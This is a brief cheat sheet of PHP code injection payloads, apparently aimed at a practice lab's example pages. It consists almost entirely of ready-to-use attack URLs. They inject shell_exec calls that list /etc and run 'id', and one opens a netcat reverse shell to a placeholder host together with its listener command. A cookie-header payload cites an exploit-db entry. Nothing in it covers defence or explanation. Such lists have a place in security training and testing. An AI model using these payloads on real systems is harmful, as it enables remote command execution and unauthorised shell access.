PHP Code Injection Examples
---
```
http://xxx.xxx.xxx.xxx/codeexec/example1.php?name=hacker%7b$%7bshell_exec('ls%20-al%20/etc/apache2')%7d%7d
http://xxx.xxx.xxx.xxx/codeexec/example1.php?name=hacker{${shell_exec('ls%20-al%20/etc/')}}

http://xxx.xxx.xxx.xxx/codeexec/example1.php?name=hacker%7b$%7bshell_exec('id')%7d%7d
http://xxx.xxx.xxx.xxx/codeexec/example1.php?name=hacker{${shell_exec('id')}}

# Reverse Shell
# nc -lvvnp 1234
http://xxx.xxx.xxx.xxx/codeexec/example2.php?order=%7b$%7bshell_exec('nc%20xxx.xxx.xxx.xxx%201234%20-e%20/bin/bash')%7d%7d
http://xxx.xxx.xxx.xxx/codeexec/example2.php?order={${shell_exec('nc xxx.xxx.xxx.xxx 1234 -e /bin/bash')}}

# https://www.exploit-db.com/exploits/46276
Cookie: CSRF-TOKEN=rnqvt{{shell_exec('ls -lah')}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl
```
